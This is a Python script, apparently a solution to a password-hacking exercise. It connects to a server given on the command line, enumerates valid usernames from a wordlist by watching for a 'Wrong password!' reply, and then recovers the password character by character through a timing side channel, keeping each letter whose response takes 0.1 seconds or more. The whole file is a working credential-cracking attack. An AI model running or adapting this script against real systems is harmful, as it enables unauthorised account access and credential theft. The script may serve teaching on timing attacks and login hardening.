import socket
from json import dumps, loads
from sys import argv
from string import ascii_letters, digits
from datetime import datetime

hostname, port = argv[1:]
address = (hostname, int(port))
password_letters = ascii_letters + digits

with socket.socket() as my_socket:
    my_socket.connect(address)
    ID = str()
    password = str()
    with open('./hacking/logins.txt') as logins_file:
        for login in logins_file:
            data_dict = dumps({"login": login.strip(), "password": " "})
            my_socket.send(data_dict.encode())
            server_response = loads(my_socket.recv(1024).decode())
            if server_response["result"] == "Wrong password!":
                ID = login.strip()
                break
    break_outer_loop = False
    while not break_outer_loop:
        for letter in password_letters:
            start_time = datetime.now()
            my_socket.send(dumps({'login': ID, 'password': password + letter}).encode())
            server_response = loads(my_socket.recv(1024).decode())
            end_time = datetime.now()
            delay = 0.1
            if (end_time - start_time).total_seconds() >= delay:
                password += letter
                break
            if server_response['result'] == 'Connection success!':
                break_outer_loop = True
                print(dumps({"login": ID, "password": password + letter}))
                break

